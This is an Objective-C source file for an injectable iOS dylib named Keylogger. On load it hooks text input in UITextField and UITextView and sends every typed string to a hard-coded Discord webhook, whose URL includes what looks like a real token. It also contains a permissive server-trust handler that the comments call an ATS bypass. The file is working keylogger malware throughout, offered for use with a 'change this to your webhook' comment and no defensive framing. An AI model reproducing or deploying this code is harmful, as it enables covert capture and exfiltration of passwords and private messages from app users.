#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

// =============================================================================
// MARK: - Keylogger Interface
// =============================================================================
@interface Keylogger : NSObject <NSURLSessionDataDelegate>
+ (instancetype)sharedInstance;
- (void)startLogging;
- (void)sendToWebhook:(NSString *)data;
@end

// =============================================================================
// MARK: - Keylogger Implementation
// =============================================================================
@implementation Keylogger

// --- CHANGE THIS TO YOUR DISCORD WEBHOOK URL ---
static NSString *webhookURL = @"https://discord.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";

// --- Singleton ---
+ (instancetype)sharedInstance {
    static Keylogger *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[Keylogger alloc] init];
    });
    return instance;
}

// --- C Function for Swizzling (THE FIX) ---
// This is a standalone C function that will replace the original insertText: implementation.
// It correctly handles the 'self' and '_cmd' parameters that Objective-C methods implicitly have.
void swizzled_insertText(id self, SEL _cmd, NSString *text) {
    // Log the intercepted input
    NSLog(@"[Keylogger] Intercepted text: %@", text);
    
    // Send to our webhook via the singleton
    [[Keylogger sharedInstance] sendToWebhook:text];
    
    // Get the original implementation from the Keylogger class where we stored it.
    // We need to look up the original method and call it directly on the 'self' object (the text field).
    Class textFieldClass = objc_getClass("UITextField");
    Class textViewClass = objc_getClass("UITextView");
    
    // Determine the class of the object we are swizzling
    Class targetClass = [self isKindOfClass:textFieldClass] ? textFieldClass : textViewClass;
    
    if (targetClass) {
        // Get the original method implementation. It's now stored under our swizzled function's selector.
        Method originalMethod = class_getInstanceMethod(targetClass, @selector(swizzled_insertText:));
        if (originalMethod) {
            // Cast the function pointer to the correct type and call it.
            void (*originalImp)(id, SEL, NSString *) = (void (*)(id, SEL, NSString *))method_getImplementation(originalMethod);
            originalImp(self, _cmd, text);
        }
    }
}


// --- Safer Core Swizzling Logic ---
- (void)startLogging {
    NSLog(@"[Keylogger] Starting logging...");
    
    // Swizzle UITextField
    Class textFieldClass = objc_getClass("UITextField");
    if (textFieldClass) {
        Method originalMethod = class_getInstanceMethod(textFieldClass, @selector(insertText:));
        if (originalMethod) {
            // We are providing our C function as the implementation.
            // The signature 'v@:@' means: return type void (v), id self (@), SEL _cmd (:), NSString* text (@)
            class_replaceMethod(textFieldClass, @selector(insertText:), (IMP)swizzled_insertText, "v@:@");
            NSLog(@"[Keylogger] Successfully swizzled UITextField.");
        } else {
            NSLog(@"[Keylogger] Could not find insertText: on UITextField.");
        }
    }
    
    // Swizzle UITextView
    Class textViewClass = objc_getClass("UITextView");
    if (textViewClass) {
        Method originalMethod = class_getInstanceMethod(textViewClass, @selector(insertText:));
        if (originalMethod) {
            class_replaceMethod(textViewClass, @selector(insertText:), (IMP)swizzled_insertText, "v@:@");
            NSLog(@"[Keylogger] Successfully swizzled UITextView.");
        } else {
            NSLog(@"[Keylogger] Could not find insertText: on UITextView.");
        }
    }
    
    NSLog(@"[Keylogger] Logging started.");
}


// --- Webhook Sender (ATS-Bypassing Version) ---
- (void)sendToWebhook:(NSString *)data {
    if ([webhookURL isEqualToString:@"PASTE_YOUR_WEBHOOK_URL_HERE"]) {
        NSLog(@"[Keylogger] Webhook URL is not set. Aborting send.");
        return;
    }
    
    NSURL *url = [NSURL URLWithString:webhookURL];
    if (!url) {
        NSLog(@"[Keylogger] Invalid webhook URL format.");
        return;
    }

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    
    NSDictionary *jsonDict = @{ @"content": data, @"username": @"Keylogger" };
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:&error];
    if (error) {
        NSLog(@"[Keylogger] Error creating JSON: %@", error.localizedDescription);
        return;
    }
    [request setHTTPBody:jsonData];

    NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:config delegate:self delegateQueue:nil];
    
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request];
    [task resume];
}

// =============================================================================
// MARK: - NSURLSessionDataDelegate (ATS Bypass)
// =============================================================================

- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition disposition, NSURLCredential *credential))completionHandler {
    if (challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust) {
        NSURLCredential *credential = [NSURLCredential credentialForTrust:challenge.protectionSpace.serverTrust];
        completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
    } else {
        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
    }
}

- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveResponse:(NSURLResponse *)response completionHandler:(void (^)(NSURLSessionResponseDisposition disposition))completionHandler {
    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
    NSLog(@"[Keylogger] Webhook sent successfully. Status code: %ld", (long)[httpResponse statusCode]);
    completionHandler(NSURLSessionResponseAllow);
}

- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
    if (error) {
        NSLog(@"[Keylogger] Error sending to webhook: %@", error.localizedDescription);
    }
}

@end

// =============================================================================
// MARK: - Constructor & Deferred Initialization
// =============================================================================

__attribute__((constructor))
void initKeylogger() {
    NSLog(@"[Keylogger] Constructor called. Deferring setup...");
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification
                                                      object:nil
                                                       queue:[NSOperationQueue mainQueue]
                                                  usingBlock:^(NSNotification * _Nonnull note) {
        NSLog(@"[Keylogger] App is now active. Starting setup.");
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Dylib Injected"
                                                                           message:@"The Keylogger dylib is active."
                                                                    preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
            
            UIWindow *keyWindow = nil;
            if (@available(iOS 13.0, *)) {
                for (UIWindowScene *windowScene in [[UIApplication sharedApplication].connectedScenes allObjects]) {
                    if ([windowScene isKindOfClass:[UIWindowScene class]]) {
                        keyWindow = windowScene.windows.firstObject;
                        break;
                    }
                }
                if (!keyWindow) {
                    keyWindow = [[UIApplication sharedApplication] windows].firstObject;
                }
            } else {
                keyWindow = [[UIApplication sharedApplication] keyWindow];
            }
        
            
            UIViewController *rootViewController = keyWindow.rootViewController;
            if (rootViewController) {
                [rootViewController presentViewController:alert animated:YES completion:nil];
            }
        });

        // 2. Start the main logging logic
        [[Keylogger sharedInstance] startLogging];

        // 3. Send a webhook to test connectivity
        [[Keylogger sharedInstance] sendToWebhook:@"Dylib successfully injected and setup executed."];
    }];
}
